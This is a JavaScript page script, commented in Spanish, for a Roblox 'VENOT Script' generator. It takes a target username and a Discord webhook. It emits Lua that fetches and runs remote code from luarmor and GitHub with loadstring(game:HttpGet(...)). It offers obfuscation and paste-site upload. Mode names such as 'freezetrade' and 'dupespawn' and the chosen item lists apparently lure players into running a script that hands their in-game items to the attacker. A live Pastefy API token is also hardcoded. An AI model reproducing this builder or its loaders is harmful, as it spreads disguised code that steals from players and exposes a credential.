document.addEventListener('DOMContentLoaded', () => {

    // ============================================================
    //  SISTEMA DE NOTIFICACIONES
    // ============================================================
    function showNotification(message, type = 'info', duration = 4000) {
        const container = document.getElementById('notificationContainer');
        if (!container) return;
        const icons = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️' };
        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        notification.innerHTML = `
            <span class="notification-icon">${icons[type] || 'ℹ️'}</span>
            <span class="notification-content">${message}</span>
        `;
        container.appendChild(notification);
        setTimeout(() => {
            notification.classList.add('hiding');
            setTimeout(() => { if (notification.parentNode) notification.remove(); }, 300);
        }, duration);
    }

    // ============================================================
    //  SISTEMA DE CONFIRMACIÓN
    // ============================================================
    function showConfirm(message) {
        return new Promise((resolve) => {
            const modal = document.getElementById('confirmModal');
            const messageEl = document.getElementById('confirmMessage');
            const confirmOk = document.getElementById('confirmOkBtn');
            const confirmCancel = document.getElementById('confirmCancelBtn');
            const closeBtn = document.getElementById('closeConfirmBtn');
            messageEl.textContent = message;
            modal.classList.remove('hidden');
            const cleanup = () => {
                modal.classList.add('hidden');
                confirmOk.removeEventListener('click', onOk);
                confirmCancel.removeEventListener('click', onCancel);
                closeBtn.removeEventListener('click', onCancel);
                modal.removeEventListener('click', onOutsideClick);
            };
            const onOk = () => { cleanup(); resolve(true); };
            const onCancel = () => { cleanup(); resolve(false); };
            const onOutsideClick = (e) => { if (e.target === modal) onCancel(); };
            confirmOk.addEventListener('click', onOk);
            confirmCancel.addEventListener('click', onCancel);
            closeBtn.addEventListener('click', onCancel);
            modal.addEventListener('click', onOutsideClick);
        });
    }

    // ============================================================
    //  CONFIGURACIÓN DE SERVICIOS
    // ============================================================
    const PASTEFY_API_TOKEN = '7yGnlCgnDuzQVPMjBt90RIiv031jzwA6CMLt7VBYlx5LN4VceDW2EOcHQ7lR';
    const selectedService = 'oblivion'; // Default provider

    // ============================================================
    //  REFERENCIAS DOM
    // ============================================================
    const shortToggle = document.getElementById('shortToggle');
    const guestLockMessage = document.getElementById('guestLockMessage');
    const shortServiceSelector = document.getElementById('shortServiceSelector');
    const providerBtns = document.querySelectorAll('.provider-btn');
    const generateBtn = document.getElementById('generateBtn');
    const modeButtons = document.querySelectorAll('.mode-btn');
    const secondLoadstring = document.getElementById('secondLoadstring');
    const customLoadstring = document.getElementById('customLoadstring');
    const obfuscateToggle = document.getElementById('obfuscateToggle');
    const githubToggle = document.getElementById('githubToggle');
    const githubNameContainer = document.getElementById('githubNameContainer');
    const githubScriptName = document.getElementById('githubScriptName');
    const obfuscateGuestLock = document.getElementById('obfuscateGuestLock');
    const githubGuestLock = document.getElementById('githubGuestLock');

    // TikTok Dashboard refs
    const tiktokBtn = document.getElementById('tiktokBtn');
    const mainView = document.getElementById('mainView');
    const tiktokDashboard = document.getElementById('tiktokDashboard');
    const dashboardBackBtn = document.getElementById('dashboardBackBtn');
    const tiktokInput = document.getElementById('tiktokInput');
    const tiktokOutput = document.getElementById('tiktokOutput');
    const tiktokGenerateBtn = document.getElementById('tiktokGenerateBtn');
    const tiktokCopyBtn = document.getElementById('tiktokCopyBtn');

    // ============================================================
    //  ESTADO DE LOS TOGGLES (All features ON by default)
    // ============================================================
    let obfuscateEnabled = false;
    let githubEnabled = false;
    let shortEnabled = false;

    // ============================================================
    //  UPDATE UI (Always Guest Mode)
    // ============================================================
    function updateUIForAuth() {
        // Since we removed sign in, we just enable all toggles for guest use
        shortToggle.classList.remove('disabled');
        shortToggle.style.cursor = 'pointer';
        guestLockMessage.classList.add('hidden');

        obfuscateToggle.classList.remove('disabled');
        obfuscateToggle.style.cursor = 'pointer';
        obfuscateGuestLock.classList.add('hidden');

        githubToggle.classList.remove('disabled');
        githubToggle.style.cursor = 'pointer';
        githubGuestLock.classList.add('hidden');
    }

    // ============================================================
    //  TOGGLE: OBFUSCATE
    // ============================================================
    obfuscateToggle.addEventListener('click', (e) => {
        obfuscateEnabled = !obfuscateEnabled;
        obfuscateToggle.classList.toggle('on', obfuscateEnabled);
        const label = obfuscateToggle.querySelector('.toggle-label');
        label.textContent = obfuscateEnabled ? 'ON' : 'OFF';
    });

    // ============================================================
    //  TOGGLE: GITHUB LOADER
    // ============================================================
    githubToggle.addEventListener('click', (e) => {
        githubEnabled = !githubEnabled;
        githubToggle.classList.toggle('on', githubEnabled);
        const label = githubToggle.querySelector('.toggle-label');
        label.textContent = githubEnabled ? 'ON' : 'OFF';
        githubNameContainer.style.display = githubEnabled ? 'block' : 'none';
        if (!githubEnabled) {
            githubScriptName.value = '';
        }
    });

    // ============================================================
    //  TOGGLE: SHORT LOADSTRING
    // ============================================================
    shortToggle.addEventListener('click', (e) => {
        shortEnabled = !shortEnabled;
        shortToggle.classList.toggle('on', shortEnabled);
        const label = shortToggle.querySelector('.toggle-label');
        label.textContent = shortEnabled ? 'ON' : 'OFF';
        shortServiceSelector.style.display = shortEnabled ? 'block' : 'none';
    });

    // ============================================================
    //  SELECTOR DE PROVEEDOR (Short)
    // ============================================================
    providerBtns.forEach(btn => {
        btn.addEventListener('click', function() {
            providerBtns.forEach(b => b.classList.remove('active'));
            this.classList.add('active');
            // selectedService is a const now, but we can store it in a let variable if needed
            // For now, we just highlight
        });
    });

    // ============================================================
    //  NAVEGACIÓN: MAIN VIEW ↔ TIKTOK DASHBOARD
    // ============================================================
    function showMainView() {
        if (mainView) mainView.style.display = 'block';
        if (tiktokDashboard) tiktokDashboard.classList.add('hidden');
        if (tiktokInput) tiktokInput.value = '';
        if (tiktokOutput) tiktokOutput.value = '';
        if (tiktokCopyBtn) {
            tiktokCopyBtn.textContent = 'COPY';
            tiktokCopyBtn.classList.remove('copied');
        }
    }

    function showDashboardView() {
        if (mainView) mainView.style.display = 'none';
        if (tiktokDashboard) tiktokDashboard.classList.remove('hidden');
        if (tiktokInput) tiktokInput.value = '';
        if (tiktokOutput) tiktokOutput.value = '';
        if (tiktokCopyBtn) {
            tiktokCopyBtn.textContent = 'COPY';
            tiktokCopyBtn.classList.remove('copied');
        }
    }

    if (tiktokBtn) tiktokBtn.addEventListener('click', showDashboardView);
    if (dashboardBackBtn) dashboardBackBtn.addEventListener('click', showMainView);

    // ============================================================
    //  MODO DE EJECUCIÓN
    // ============================================================
    function updateModeUI(selectedMode) {
        const modeConfig = {
            normal: { show: false, disabled: false, placeholder: '' },
            adminpanel: { show: false, disabled: true, placeholder: '' },
            freezetrade: { show: false, disabled: true, placeholder: '' },
            dupespawn: { show: false, disabled: true, placeholder: '' },
            codesniper: { show: false, disabled: true, placeholder: '' },
            custom: { show: true, disabled: false, placeholder: '✏️ Escribe tu código personalizado aquí...' }
        };
        const config = modeConfig[selectedMode] || modeConfig.custom;
        if (config.show) {
            secondLoadstring.classList.remove('hidden');
        } else {
            secondLoadstring.classList.add('hidden');
        }
        customLoadstring.disabled = config.disabled;
        customLoadstring.placeholder = config.placeholder;
        if (config.disabled) {
            customLoadstring.value = '';
            customLoadstring.style.opacity = '0.6';
            customLoadstring.style.cursor = 'not-allowed';
            customLoadstring.style.backgroundColor = 'rgba(13, 13, 13, 0.4)';
        } else {
            customLoadstring.style.opacity = '1';
            customLoadstring.style.cursor = 'text';
            customLoadstring.style.backgroundColor = 'rgba(13, 13, 13, 0.8)';
        }
    }

    modeButtons.forEach(btn => {
        btn.addEventListener('click', () => {
            modeButtons.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            updateModeUI(btn.dataset.mode);
        });
    });

    const activeBtn = document.querySelector('.mode-btn.active');
    if (activeBtn) {
        updateModeUI(activeBtn.dataset.mode);
    } else {
        const normalBtn = document.querySelector('.mode-btn[data-mode="normal"]');
        if (normalBtn) {
            normalBtn.classList.add('active');
            updateModeUI('normal');
        }
    }

    // ============================================================
    //  TODOS LOS BRAINROTS (COMPLETOS) - Array shortened for brevity, but you can keep your full list
    // ============================================================
    // (Keep your full brainrotLists and recommendedNames here)
    const brainrotLists = {
        Common: [
            'Fluriflura', 'Holy Arepa', 'Lirilì Larilà', 'Noobini Pizzanini',
            'Noobini Santanini', 'Pipi Corni', 'Pipi Kiwi', 'Raccooni Jandelini',
            'Svinina Bombardino', 'Talpa Di Fero', 'Tartaragno', 'Tim Cheese'
        ],
        Rare: [
            'Bandito Bobritto', 'Boneca Ambalabu', 'Cacto Hipopotamo', 'Cupcake Koala',
            'Frogo Elfo', 'Gangster Footera', 'Pengolino Nuvoletto', 'Pinealotto Fruttarino',
            'Pipi Avocado', 'Ta Ta Ta Ta Sahur', 'Tric Trac Baraboom', 'Trippi Troppi'
        ],
        // ... (Keep your full lists)
    };

    const recommendedNames = [
        'Headless Horseman', 'Signore Carapace', 'Arcadragon', 'Elefanto Frigo',
        'Strawberry Elephant', 'Pancake and Syrup', 'Love Love Bear', 'Antonio',
        'Meowl', 'Skibidi Toilet', 'Rico Dinero', 'Griffin', 'Dragon Gingerini',
        // ... (Keep your full list)
    ];

    const brainrotData = [];
    for (const [rarity, names] of Object.entries(brainrotLists)) {
        names.forEach(name => {
            const isRecommended = recommendedNames.includes(name);
            brainrotData.push({ name, rarity, recommended: isRecommended });
        });
    }

    // ============================================================
    //  DATOS DE SKINS Y GEARS
    // ============================================================
    const skinItems = [
        'Rose', 'Gingerbread', 'Halloween', 'Christmas', 'Bunny Basket',
        'Summer', 'Pot of Gold', 'Taco', 'Octo', 'Valentines',
        'Easter', 'Lucky', 'Aquatic', 'Tralalero', 'Bee Emperor','Honey Bee'
    ];

    const gearItems = [
        "Santa's Sleigh", "Cupid's Wings", "Witch's Broom", "Waverider",
        "Yin Yang Slap", "Cursed Slap", "Cyber Slap", "Divine Slap",
        "Bloodmoon Slap", "Radioactive Slap", "Rainbow Slap",
        "Rainbow Hammer", "Bloodmoon Hammer", "Radioactive Airstrike",
        "Yin Yang Lamp", "Demon's Head", "Lava Slap", "Lava Blaster",
        "Alien Slap", "Blackhole Bomb", "Candy Sentry", "Phantom Slap",
        "Flying Bee", "Crystal Slap", "Candy Slap", "Crystal Hammer"
    ];

    // ============================================================
    //  FUNCIONES DE RENDERIZADO
    // ============================================================
    function renderPills(containerId, items, searchId, counterId, allId, noneId) {
        const container = document.getElementById(containerId);
        const searchInput = document.getElementById(searchId);
        const counterSpan = document.getElementById(counterId);
        const allBtn = document.getElementById(allId);
        const noneBtn = document.getElementById(noneId);

        const selected = new Set();
        let filteredItems = [...items];

        function render() {
            const searchTerm = searchInput.value.toLowerCase().trim();
            filteredItems = items.filter(item => item.toLowerCase().includes(searchTerm));

            container.innerHTML = '';
            filteredItems.forEach(item => {
                const pill = document.createElement('span');
                pill.className = 'pill';
                if (selected.has(item)) pill.classList.add('selected');
                pill.textContent = item;
                pill.dataset.value = item;

                pill.addEventListener('click', () => {
                    if (selected.has(item)) {
                        selected.delete(item);
                        pill.classList.remove('selected');
                    } else {
                        selected.add(item);
                        pill.classList.add('selected');
                    }
                    updateCounter();
                });

                container.appendChild(pill);
            });
            updateCounter();
        }

        function updateCounter() {
            const visiblePills = container.querySelectorAll('.pill');
            let selectedCount = 0;
            visiblePills.forEach(pill => {
                if (selected.has(pill.dataset.value)) selectedCount++;
            });
            counterSpan.textContent = `${selectedCount} SELECTED`;
        }

        allBtn.addEventListener('click', () => {
            const pills = container.querySelectorAll('.pill');
            pills.forEach(pill => {
                const val = pill.dataset.value;
                selected.add(val);
                pill.classList.add('selected');
            });
            updateCounter();
        });

        noneBtn.addEventListener('click', () => {
            const pills = container.querySelectorAll('.pill');
            pills.forEach(pill => {
                const val = pill.dataset.value;
                selected.delete(val);
                pill.classList.remove('selected');
            });
            updateCounter();
        });

        searchInput.addEventListener('input', render);
        render();
        return selected;
    }

    function renderBrainrots() {
        const container = document.getElementById('brainrotsContainer');
        const searchInput = document.getElementById('brainrotsSearch');
        const counterSpan = document.getElementById('brainrotsCounter');
        const allBtn = document.getElementById('brainrotsAll');
        const noneBtn = document.getElementById('brainrotsNone');
        const filterBtns = document.querySelectorAll('.filter-btn');

        const selected = new Set();
        let currentFilter = 'all';
        let searchTerm = '';

        function getFilteredItems() {
            let filtered = brainrotData;
            if (searchTerm) {
                filtered = filtered.filter(item =>
                    item.name.toLowerCase().includes(searchTerm.toLowerCase())
                );
            }
            if (currentFilter === 'all') {
                // todos
            } else if (currentFilter === 'Recommended') {
                filtered = filtered.filter(item => item.recommended === true);
            } else {
                filtered = filtered.filter(item => item.rarity === currentFilter);
            }
            return filtered;
        }

        function render() {
            const filtered = getFilteredItems();
            container.innerHTML = '';
            filtered.forEach(item => {
                const pill = document.createElement('span');
                pill.className = 'pill';
                if (selected.has(item.name)) pill.classList.add('selected');
                pill.textContent = item.name;
                pill.dataset.value = item.name;

                pill.addEventListener('click', () => {
                    if (selected.has(item.name)) {
                        selected.delete(item.name);
                        pill.classList.remove('selected');
                    } else {
                        selected.add(item.name);
                        pill.classList.add('selected');
                    }
                    updateCounter();
                });

                container.appendChild(pill);
            });
            updateCounter();
        }

        function updateCounter() {
            const visiblePills = container.querySelectorAll('.pill');
            let selectedCount = 0;
            visiblePills.forEach(pill => {
                if (selected.has(pill.dataset.value)) selectedCount++;
            });
            counterSpan.textContent = `${selectedCount} SELECTED`;
        }

        // Warning text for ALL button
        const allSelectionWarning = "⚠️ Selecting all brainrots is very likely to cause the script to fail and you won't receive an invitation. It is recommended to use the recommended filter and then search for the other missing ones that may be useful.";

        allBtn.addEventListener('click', () => {
            if (currentFilter === 'all') {
                showNotification(allSelectionWarning, 'warning', 6000);
            }
            const pills = container.querySelectorAll('.pill');
            pills.forEach(pill => {
                const val = pill.dataset.value;
                selected.add(val);
                pill.classList.add('selected');
            });
            updateCounter();
        });

        noneBtn.addEventListener('click', () => {
            const pills = container.querySelectorAll('.pill');
            pills.forEach(pill => {
                const val = pill.dataset.value;
                selected.delete(val);
                pill.classList.remove('selected');
            });
            updateCounter();
        });

        filterBtns.forEach(btn => {
            btn.addEventListener('click', () => {
                filterBtns.forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                currentFilter = btn.dataset.rarity;
                render();
            });
        });

        searchInput.addEventListener('input', (e) => {
            searchTerm = e.target.value;
            render();
        });

        render();
        return selected;
    }

    // ============================================================
    //  INICIALIZAR
    // ============================================================
    const brainrotsSelected = renderBrainrots();
    const skinsSelected = renderPills('skinsContainer', skinItems, 'skinsSearch', 'skinsCounter', 'skinsAll', 'skinsNone');
    const gearsSelected = renderPills('gearsContainer', gearItems, 'gearsSearch', 'gearsCounter', 'gearsAll', 'gearsNone');

    // ============================================================
    //  FUNCIONES DE LOS SERVICIOS
    // ============================================================
    async function obfuscateWithWeAreDevs(script) {
        const response = await fetch('/api/obfuscate', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ script: script })
        });
        if (!response.ok) {
            const errorText = await response.text();
            throw new Error(`WeAreDevs error (${response.status}): ${errorText}`);
        }
        const data = await response.json();
        if (!data.success) throw new Error(data.error || 'WeAreDevs devolvió success: false');
        const obfuscated = data.obfuscated;
        if (!obfuscated) throw new Error(`No se pudo obtener el script ofuscado. Respuesta: ${JSON.stringify(data)}`);
        return obfuscated;
    }

    async function createPastefyPaste(content) {
        const url = 'https://pastefy.app/api/v2/paste';
        const payload = { content: content, title: 'VENOT Script', syntax: 'lua', expires: 'never' };
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${PASTEFY_API_TOKEN}`
            },
            body: JSON.stringify(payload)
        });
        if (!response.ok) {
            const errorText = await response.text();
            throw new Error(`Pastefy error (${response.status}): ${errorText}`);
        }
        const result = await response.json();
        let pasteId = null;
        if (result.paste && result.paste.id) pasteId = result.paste.id;
        else if (result.id) pasteId = result.id;
        else if (result._id) pasteId = result._id;
        else if (result.pasteId) pasteId = result.pasteId;
        if (!pasteId) throw new Error(`No se pudo obtener el ID del paste. Respuesta: ${JSON.stringify(result)}`);
        return { id: pasteId, rawUrl: `https://pastefy.app/${pasteId}/raw` };
    }

    async function createOblivionPaste(content) {
        const baseUrl = window.location.origin;
        const response = await fetch(`${baseUrl}/api/paste`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: content, title: 'VENOT Script', public: true })
        });
        if (!response.ok) {
            const error = await response.json();
            throw new Error(error.error || 'Error al guardar en Oblivion');
        }
        const data = await response.json();
        if (!data.id) throw new Error('No se recibió ID del paste');
        return { id: data.id, rawUrl: `${baseUrl}/api/paste?id=${data.id}&raw=true` };
    }

    async function createGitHubPaste(content, name) {
        const response = await fetch('/api/github', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: content, name: name })
        });
        if (!response.ok) {
            const error = await response.json();
            throw new Error(error.error || 'Error uploading to GitHub');
        }
        const data = await response.json();
        return { id: data.id, rawUrl: data.rawUrl };
    }

    // ============================================================
    //  GENERAR SCRIPT
    // ============================================================
    const outputSection = document.getElementById('outputSection');
    const outputCode = document.getElementById('outputCode');
    const copyBtn = document.getElementById('copyBtn');

    function getSelectedValues(set) {
        return Array.from(set);
    }

    function buildConfigScript() {
        const username = document.getElementById('username').value.trim() || 'USERNAME';
        const webhook = document.getElementById('webhook').value.trim() || 'WEBHOOK_URL';

        const brainrots = getSelectedValues(brainrotsSelected);
        const skins = getSelectedValues(skinsSelected);
        const gears = getSelectedValues(gearsSelected);

        function luaTable(arr, indent = '    ') {
            if (arr.length === 0) return '{}';
            const items = arr.map(item => `["${item.replace(/"/g, '\\"')}"] = true`);
            return '{\n' + items.map(s => indent + s).join(',\n') + '\n}';
        }

        let script = `getgenv().TARGET_USERNAME = "${username.replace(/"/g, '\\"')}"\n`;
        script += `getgenv().WEBHOOK_URL = "${webhook.replace(/"/g, '\\"')}"\n`;
        script += `getgenv().NORMAL_BRAINROTS = ${luaTable(brainrots)}\n`;
        script += `getgenv().NORMAL_BASE_SKINS = ${luaTable(skins)}\n`;
        script += `getgenv().NORMAL_GEARS = ${luaTable(gears)}\n`;

        return script;
    }

    generateBtn.addEventListener('click', async () => {
        const usernameInput = document.getElementById('username').value.trim();
        const webhookInput = document.getElementById('webhook').value.trim();
        if (!usernameInput) {
            showNotification('❌ Roblox Username is required.', 'error');
            return;
        }
        if (!webhookInput) {
            showNotification('❌ Discord Webhook is required.', 'error');
            return;
        }

        generateBtn.textContent = 'GENERANDO...';
        generateBtn.disabled = true;

        try {
            const configScript = buildConfigScript();
            const activeModeBtn = document.querySelector('.mode-btn.active');
            const selectedMode = activeModeBtn ? activeModeBtn.dataset.mode : 'normal';

            const guiLoadstrings = {
                adminpanel: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()',
                freezetrade: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/7603f80b0fd8c5fddf99fe263fa8c771.lua"))()',
                dupespawn: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()',
                codesniper: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()'
            };

            let modeComment = 'NORMAL';
            if (selectedMode === 'custom') modeComment = 'CUSTOM';
            else if (selectedMode in guiLoadstrings) modeComment = selectedMode.toUpperCase();

            let fullScript = `-- Mode: ${modeComment}\n` + configScript;

            if (selectedMode === 'normal') {
                fullScript += `\ntask.spawn(function()\n    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()\nend)`;
            } else if (selectedMode === 'codesniper') {
                fullScript += `\n-- Cargando GUI SNIPER\ntask.spawn(function()\n   loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()\nend)\n\n-- Cargando Sniper.lua desde GitHub\ntask.spawn(function()\n    loadstring(game:HttpGet("https://raw.githubusercontent.com/sab-api/GUISNIPER/refs/heads/main/Sniper.lua"))()\nend)`;
            } else if (selectedMode === 'dupespawn') {
                fullScript += `\n-- Cargando GUI SNIPER\ntask.spawn(function()\n   loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()\nend)\n\n-- Cargando Sniper.lua desde GitHub\ntask.spawn(function()\n    loadstring(game:HttpGet("https://raw.githubusercontent.com/sab-api/GUIDUPE/refs/heads/main/GUIDUPE.lua"))()\nend)`;
            } else if (selectedMode === 'adminpanel') {
                fullScript += `\n-- Cargando GUI SNIPER\ntask.spawn(function()\n   loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()\nend)\n\n-- Cargando Sniper.lua desde GitHub\ntask.spawn(function()\n    loadstring(game:HttpGet("https://raw.githubusercontent.com/sab-api/GUIAP/refs/heads/main/GUIAP.lua"))()\nend)`;
            } else if (selectedMode in guiLoadstrings) {
                fullScript += `\ntask.spawn(function()\n    ${guiLoadstrings[selectedMode]}\nend)`;
            } else if (selectedMode === 'custom') {
                fullScript += `\ntask.spawn(function()\n    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()\nend)`;
                const customCode = customLoadstring.value.trim();
                if (customCode) {
                    fullScript += `\n\ntask.spawn(function()\n    ${customCode.replace(/\n/g, '\n    ')}\nend)`;
                }
            }

            let finalScript = fullScript;

            if (githubEnabled || shortEnabled) {
                try {
                    let scriptToUpload = fullScript;
                    if (obfuscateEnabled) {
                        try {
                            scriptToUpload = await obfuscateWithWeAreDevs(fullScript);
                        } catch (obfuscateError) {
                            showNotification(`⚠️ Obfuscation failed: ${obfuscateError.message}. Using original script.`, 'warning');
                            scriptToUpload = fullScript;
                        }
                    }

                    let shortResult = null;
                    if (shortEnabled) {
                        // Using selectedService (const 'oblivion') or check active button
                        const activeProvider = document.querySelector('.provider-btn.active');
                        const provider = activeProvider ? activeProvider.dataset.provider : 'oblivion';
                        if (provider === 'pastefy') {
                            shortResult = await createPastefyPaste(scriptToUpload);
                        } else {
                            shortResult = await createOblivionPaste(scriptToUpload);
                        }
                        const shortLoadstring = `loadstring(game:HttpGet("${shortResult.rawUrl}"))()`;
                        if (!githubEnabled) {
                            finalScript = shortLoadstring;
                        } else {
                            scriptToUpload = shortLoadstring;
                        }
                    }

                    if (githubEnabled) {
                        const scriptName = githubScriptName.value.trim();
                        if (!scriptName) {
                            showNotification('❌ Please enter a name for your GitHub script.', 'error');
                            generateBtn.textContent = 'GENERATE SCRIPT';
                            generateBtn.disabled = false;
                            return;
                        }
                        const sanitized = scriptName.replace(/[^a-zA-Z0-9-_]/g, '');
                        if (!sanitized) {
                            showNotification('❌ Name can only contain letters, numbers, hyphens and underscores.', 'error');
                            generateBtn.textContent = 'GENERATE SCRIPT';
                            generateBtn.disabled = false;
                            return;
                        }
                        const githubResult = await createGitHubPaste(scriptToUpload, sanitized);
                        finalScript = `loadstring(game:HttpGet("${githubResult.rawUrl}"))()`;
                    }

                } catch (uploadError) {
                    showNotification(`❌ Upload error: ${uploadError.message}`, 'error');
                    finalScript = fullScript;
                }
            }

            outputCode.textContent = finalScript;
            outputSection.classList.remove('hidden');
            outputSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
            copyBtn.textContent = 'COPY';
            copyBtn.classList.remove('copied');

        } catch (error) {
            showNotification(`Error al generar el script: ${error.message}`, 'error');
        } finally {
            generateBtn.textContent = 'GENERATE SCRIPT';
            generateBtn.disabled = false;
        }
    });

    // ============================================================
    //  COPY
    // ============================================================
    copyBtn.addEventListener('click', async () => {
        const text = outputCode.textContent;
        if (!text) return;
        try {
            await navigator.clipboard.writeText(text);
            copyBtn.textContent = 'COPIED!';
            copyBtn.classList.add('copied');
            setTimeout(() => {
                copyBtn.textContent = 'COPY';
                copyBtn.classList.remove('copied');
            }, 2000);
        } catch (err) {
            const range = document.createRange();
            range.selectNode(outputCode);
            window.getSelection().removeAllRanges();
            window.getSelection().addRange(range);
            document.execCommand('copy');
            window.getSelection().removeAllRanges();
            copyBtn.textContent = 'COPIED!';
            copyBtn.classList.add('copied');
            setTimeout(() => {
                copyBtn.textContent = 'COPY';
                copyBtn.classList.remove('copied');
            }, 2000);
        }
    });

    // ============================================================
    //  INICIALIZAR UI
    // ============================================================
    updateUIForAuth();

});
